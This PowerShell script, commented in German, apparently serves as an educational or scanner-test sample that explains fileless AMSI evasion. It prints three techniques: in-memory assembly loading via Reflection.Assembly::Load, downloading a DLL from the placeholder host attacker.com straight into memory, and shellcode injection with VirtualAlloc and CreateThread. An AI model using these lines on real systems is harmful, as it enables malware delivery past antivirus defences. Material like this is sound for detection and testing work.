# AMSI Bypass: .NET Assembly Loading (Fileless)
# ================================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Laedt eine .NET Assembly direkt in den Speicher ohne Dateisystem-Zugriff.
# AMSI scannt Datei-Operationen, aber In-Memory-Assemblies umgehen den
# dateibasierten Scanner komplett.
#
# WARUM ES FUNKTIONIERT:
# 1. Unser Scanner prueft nur Dateien auf der Festplatte
# 2. [Reflection.Assembly]::Load(byte[]) laedt Code direkt in den Speicher
# 3. Kein File-I/O -> kein Trigger fuer dateibasierte Scanner
# 4. AMSI v2 (Win10 1903+) scannt Assembly.Load -- aeltere Versionen nicht
#
# ERKENNUNG:
# - "reflection.assembly" wird als suspicious pattern erkannt
# - Aber: Zur Laufzeit erfolgt kein Dateizugriff den unser Scanner abfangen koennte
# - In-Memory-Only Payloads erfordern Verhaltensanalyse oder ETW-Tracing

# Simulierte In-Memory Assembly (Base64-kodierte .NET DLL)
# In der Realitaet waere dies ein kompiliertes C# Programm
$assemblyBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA..."  # Truncated

Write-Host "=== Fileless .NET Assembly Loading ==="
Write-Host ""
Write-Host "Technique: Load pre-compiled .NET assembly from memory"
Write-Host ""

# Methode 1: Direktes Laden aus Base64
Write-Host "[1] Assembly.Load from Base64:"
Write-Host '    $bytes = [Convert]::FromBase64String($payload)'
Write-Host '    $assembly = [Reflection.Assembly]::Load($bytes)'
Write-Host '    $assembly.GetType("Payload").GetMethod("Run").Invoke($null, $null)'
Write-Host ""

# Methode 2: Download + Memory Load (kein File Touch)
Write-Host "[2] Download directly to memory:"
Write-Host '    $wc = New-Object Net.WebClient'
Write-Host '    $bytes = $wc.DownloadData("http://attacker.com/payload.dll")'
Write-Host '    [Reflection.Assembly]::Load($bytes)'
Write-Host ""

# Methode 3: Unsafe memory allocation + shellcode (geht an .NET vorbei)
Write-Host "[3] Native shellcode injection:"
Write-Host '    $mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40)'
Write-Host '    [Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)'
Write-Host '    $thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)'
Write-Host ""
Write-Host "All methods bypass file-based scanning entirely."
Write-Host "Only behavioral analysis (ETW, API hooking) can detect these."
